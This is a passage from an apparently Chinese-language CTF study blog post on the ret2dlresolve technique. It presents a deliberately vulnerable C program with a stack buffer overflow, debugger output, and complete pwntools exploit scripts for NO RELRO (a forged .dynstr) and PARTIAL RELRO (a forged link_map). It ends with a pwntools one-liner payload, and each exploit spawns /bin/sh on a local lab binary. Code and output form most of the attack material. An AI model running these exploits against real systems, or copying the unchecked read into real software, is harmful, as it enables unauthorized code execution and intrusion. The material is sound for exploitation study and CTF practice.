class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((naked, noinline, used, visibility(<span class="string">&quot;default&quot;</span>)))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">    <span class="string">&quot;pop %rdi\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;ret\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %rsi\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;ret\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %rdx\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;ret\n\t&quot;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// NO RELRO：gcc -fno-stack-protector -z norelro -no-pie pwn.c -o pwn</span></span><br><span class="line"><span class="comment">// PARTIAL RELRO：gcc -fno-stack-protector -z relro -no-pie pwn.c -o pwn2</span></span><br><span class="line"><span class="comment">// glibc2.35-0ubuntu3.10</span></span><br></pre></td></tr></table></figure><h4 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h4><p>这个只有在 <code>.dynamic</code> 可写时，即<code>NO RELRO</code>。因为 <code>_dl_runtime_resolve</code> 会从 <code>.dynamic</code> 里面拿 <code>.dynstr</code> 字符串表的指针，然后加上 <code>offset</code> 取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当解析的时候，就能解析成我们所指定的任意库函数。<br>我们看原来的<code>.dynstr</code>，并找到<code>.dynamic</code>中存储这个<code>strtab</code>的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfsections</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End     Perm       Size  Name</span><br><span class="line">          0x4002e0           0x4002fc      R--       0x1c  .interp</span><br><span class="line">          0x400300           0x400330      R--       0x30  .note.gnu.property</span><br><span class="line">          0x400330           0x400354      R--       0x24  .note.gnu.build-id</span><br><span class="line">          0x400354           0x400374      R--       0x20  .note.ABI-tag</span><br><span class="line">          0x400378           0x4003a0      R--       0x28  .gnu.hash</span><br><span class="line">          0x4003a0           0x400478      R--       0xd8  .dynsym</span><br><span class="line">          0x400478           0x4004e1      R--       0x69  .dynstr</span><br><span class="line">          0x4004e2           0x4004f4      R--       0x12  .gnu.version</span><br><span class="line">          0x4004f8           0x400528      R--       0x30  .gnu.version_r</span><br><span class="line">          0x400528           0x400588      R--       0x60  .rela.dyn</span><br><span class="line">          0x400588           0x4005e8      R--       0x60  .rela.plt</span><br><span class="line">          0x401000           0x40101b      R-X       0x1b  .init</span><br><span class="line">          0x401020           0x401070      R-X       0x50  .plt</span><br><span class="line">          0x401070           0x4010b0      R-X       0x40  .plt.sec</span><br><span class="line">          0x4010b0           0x4012ab      R-X      0x1fb  .text</span><br><span class="line">          0x4012ac           0x4012b9      R-X        0xd  .fini</span><br><span class="line">          0x402000           0x402004      R--        0x4  .rodata</span><br><span class="line">          0x402004           0x402048      R--       0x44  .eh_frame_hdr</span><br><span class="line">          0x402048           0x402120      R--       0xd8  .eh_frame</span><br><span class="line">          0x403120           0x403128      RW-        0x8  .init_array</span><br><span class="line">          0x403128           0x403130      RW-        0x8  .fini_array</span><br><span class="line">          0x403130           0x403300      RW-      0x1d0  .dynamic</span><br><span class="line">          0x403300           0x403310      RW-       0x10  .got</span><br><span class="line">          0x403310           0x403348      RW-       0x38  .got.plt</span><br><span class="line">          0x403348           0x403358      RW-       0x10  .data</span><br><span class="line">          0x403360           0x403380      RW-       0x20  .bss</span><br><span class="line">pwndbg&gt; x/13s 0x400478</span><br><span class="line">0x400478:       &quot;&quot;</span><br><span class="line">0x400479:       &quot;read&quot;</span><br><span class="line">0x40047e:       &quot;write&quot;</span><br><span class="line">0x400484:       &quot;__libc_start_main&quot;</span><br><span class="line">0x400496:       &quot;stdout&quot;</span><br><span class="line">0x40049d:       &quot;strlen&quot;</span><br><span class="line">0x4004a4:       &quot;stdin&quot;</span><br><span class="line">0x4004aa:       &quot;setbuf&quot;</span><br><span class="line">0x4004b1:       &quot;libc.so.6&quot;</span><br><span class="line">0x4004bb:       &quot;GLIBC_2.2.5&quot;</span><br><span class="line">0x4004c7:       &quot;GLIBC_2.34&quot;</span><br><span class="line">0x4004d2:       &quot;__gmon_start__&quot;</span><br><span class="line">0x4004e1:       &quot;&quot;</span><br><span class="line">pwndbg&gt; tele 0x403130 30</span><br><span class="line">...</span><br><span class="line">11:0088│  0x4031b8 (_DYNAMIC+136) —▸ 0x400478 ◂— 0x7277006461657200  </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/images/re2dl-exp1.png"></p><p>以上是示意图，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">strtab = <span class="number">0x4031b8</span></span><br><span class="line">plt0 = <span class="number">0x401020</span>   </span><br><span class="line">pop_rdi_ret = <span class="number">0x4011d5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x4011d7</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x4011d9</span></span><br><span class="line"></span><br><span class="line">fake_dynstr = <span class="string">b&#x27;\x00read\x00write\x00__libc_start_main\x00&#x27;</span> + \</span><br><span class="line">    <span class="string">b&#x27;stdout\x00system\x00stdin\x00setbuf\x00libc.so.6\x00GLIBC_2.2.5\x00&#x27;</span> + \</span><br><span class="line">    <span class="string">b&#x27;GLIBC_2.34\x00__gmon_start__\x00&#x27;</span> <span class="comment"># &#x27;strlen&#x27; 替换为 &#x27;system&#x27;</span></span><br><span class="line">bss = <span class="number">0x403360</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + \</span><br><span class="line">        p64(bss + <span class="number">0x400</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x100</span>) + p64(read_plt) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(pop_rsi_ret) + p64(strtab) + p64(read_plt) + p64(pop_rdi_ret) + \</span><br><span class="line">        p64(bss + <span class="number">0x400</span>) + p64(plt0) + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 写入 ROP_chain</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + fake_dynstr </span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 写入 fake_dynstr</span></span><br><span class="line">io.sendline(p64(bss + <span class="number">0x408</span>)) <span class="comment">#写入 fake_dynstr 地址</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注意这里<code>plt0</code>后的<code>1</code>是<code>dl_runtime</code>函数的第二个参数<code>reloc_arg</code>（仍然是栈传参），其第一个参数<code>link_map</code>在<code>plt0</code>的第一条指令<code>push link_map</code>传递<br>这个<code>reloc_arg</code>是一个索引，作为 <code>.rela.plt</code>的下标，然后再从该条目里读出 <code>r_offset</code>，才知道要解析哪个<code>GOT</code>表项，这里传递<code>1</code>。方便判断，大概满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PLT 表项 N → reloc_arg = N-1</span><br></pre></td></tr></table></figure><p>这里<code>strlen</code>在<code>plt</code>中是第<strong>2</strong>项，所以传入<strong>1</strong>即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; plt</span><br><span class="line">Section .plt 0x401020 - 0x401070:</span><br><span class="line">No symbols found in section .plt</span><br><span class="line">Section .plt.sec 0x401070 - 0x4010b0:</span><br><span class="line">0x401070: write@plt</span><br><span class="line">0x401080: strlen@plt</span><br><span class="line">0x401090: setbuf@plt</span><br><span class="line">0x4010a0: read@plt</span><br></pre></td></tr></table></figure><p>效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;ls\n&#x27;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    b&#x27;exp.py\tpwn  pwn.c\n&#x27;</span><br><span class="line">exp.py  pwn  pwn.c</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h4 id="PARTIAL-RELRO"><a href="#PARTIAL-RELRO" class="headerlink" title="PARTIAL RELRO"></a>PARTIAL RELRO</h4><p>64 位下伪造时（<code>.bss</code> 段离 <code>.dynsym</code> 太远） <code>reloc-&gt;r_info</code> 也很大，最后使得访问 <code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code> 时程序访存出错，导致程序崩溃。因此我们退而求其次选择 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 不为 0 时时的程序执行流程，此时计算的目标函数地址为 <code>l-&gt;l_addr + sym-&gt;st_value</code> 。<br>虽然这种方法<strong>无法在不知道 <code>libc</code> 版本的情况下完成利用，但是可以在不泄露 <code>libc</code> 基址的情况下完成利用，以及elf基址要固定</strong>。<br>我们需要作如下构造：</p><ul><li><p><code>resolve</code> 函数传入的第二个参数为 0 ，从而从 <code>Elf64_Rel</code> 数组中找到第一个 <code>Elf64_Rel</code> 。 </p></li><li><p>为了避免更新 <code>got</code> 表时内存访问错误，<code>Elf64_Rel</code> 的 <code>r_offset</code> 加上 <code>link_map-&gt;l_addr</code> 需要指向可读写内存。 </p></li><li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的低 32 比特设置为 <code>ELF_MACHINE_JMP_SLOT</code> 即 7 。 </p></li><li><p>为了避免下面这行代码访存错误，需要让 <code>l_info[5]</code> 指向可读写内存。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure><ul><li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的高 32 比特设置为 0 这样找的就是 <code>Elf64_Sym</code> 数组中的第一个 <code>Elf64_Sym</code> 。 </p></li><li><p><code>link_map-&gt;l_info[6]-&gt;d_un.dptr</code> 指向 <code>func@got - 8</code> 这样就伪造出 <code>Elf64_Sym</code> 的 <code>st_value</code> 为 <code>func</code> 函数地址，同时 <code>st_order</code> 也大概率为非 0 。 </p></li><li><p><code>link_map</code> 的 <code>l_addr</code> 设置为 <code>&amp;system - &amp;func</code> ，这样 <code>l-&gt;l_addr + sym-&gt;st_value</code> 结果就是 <code>system</code> 函数地址。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[5])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe348 is 0x68 bytes (0xd words)</span><br><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[6])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe350 is 0x70 bytes (0xe words)</span><br><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[23])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe3d8 is 0xf8 bytes (0x1f words)</span><br></pre></td></tr></table></figure><p><code>l_info[DT_STRTAB/5]</code>指针：位于<code>link_map_addr +0x68</code><br><code>l_info[DT_SYMTAB/6]</code>指针：位于<code>link_map_addr + 0x70</code><br><code>l_info[DT_JMPREL/23]</code>指针：位于<code>link_map_addr +0xF8</code><br>示意图如下</p><p><img src="/images/re2dl-exp2.png"></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn2&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">plt0 = <span class="number">0x401020</span>   </span><br><span class="line">pop_rdi_ret = <span class="number">0x4011d5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x4011d7</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x4011d9</span></span><br><span class="line">resolve = <span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404050</span></span><br><span class="line">fake_link_map_addr = bss + <span class="number">0x400</span></span><br><span class="line">binsh = fake_link_map_addr + <span class="number">0x50</span></span><br><span class="line">offset = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>] <span class="comment"># 选择一个已解析的函数</span></span><br><span class="line">fake_link_map = p64(offset &amp; <span class="number">0xffffffffffffffff</span>) <span class="comment"># 需要这样调整一下否则 p64() 会报错</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>] - <span class="number">0x8</span>)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64((bss - offset) &amp; <span class="number">0xffffffffffffffff</span>) + p32(<span class="number">7</span>) + p32(<span class="number">0</span>)  <span class="comment"># 此处 r_offset + l_addr 为可读写地址即可</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) + p64(fake_link_map_addr + <span class="number">0x20</span>)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss) <span class="comment"># l_info[5] -&gt; 可读写地址即可</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_link_map_addr + <span class="number">0x10</span>) <span class="comment"># l_info[6]</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0xf8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_link_map_addr + <span class="number">0x40</span>) <span class="comment"># l_info[23]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + \</span><br><span class="line">        p64(fake_link_map_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x100</span>) + p64(read_plt) + \</span><br><span class="line">        p64(pop_rdi_ret) + p64(binsh) + p64(resolve) + p64(fake_link_map_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">io.send(fake_link_map.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>不要用<code>strlen</code>来算和<code>system</code>的偏移</strong>，这个函数符号有点怪，等什么时候探究一下<br>仍然可能需要注意一下栈对齐<br>效果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;ls\n&#x27;</span><br><span class="line">[DEBUG] Received 0x21 bytes:</span><br><span class="line">    b&#x27;exp.py\texp2.py  pwn  pwn.c  pwn2\n&#x27;</span><br><span class="line">exp.py  exp2.py  pwn  pwn.c  pwn2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h4 id="FULL-RELRO"><a href="#FULL-RELRO" class="headerlink" title="FULL RELRO"></a>FULL RELRO</h4><p>洗洗睡吧</p><h4 id="pwntools一把梭"><a href="#pwntools一把梭" class="headerlink" title="pwntools一把梭"></a>pwntools一把梭</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x78</span> <span class="comment">#距返回地址的偏移</span></span><br><span class="line">read_length = <span class="number">0x100</span> <span class="comment">#最大读取长度</span></span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;offset:raw_rop, read_length:dlresolve.payload&#125;)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ret2dlresolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一个问题出发的关于printf中处理fmtstr部分源码分析</title>
      <link href="/2025/09/08/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%87%BA%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8Eprintf%E4%B8%AD%E5%A4%84%E7%90%86fmtstr%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2025/09/08/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%87%BA%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8Eprintf%E4%B8%AD%E5%A4%84%E7%90%86fmtstr%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
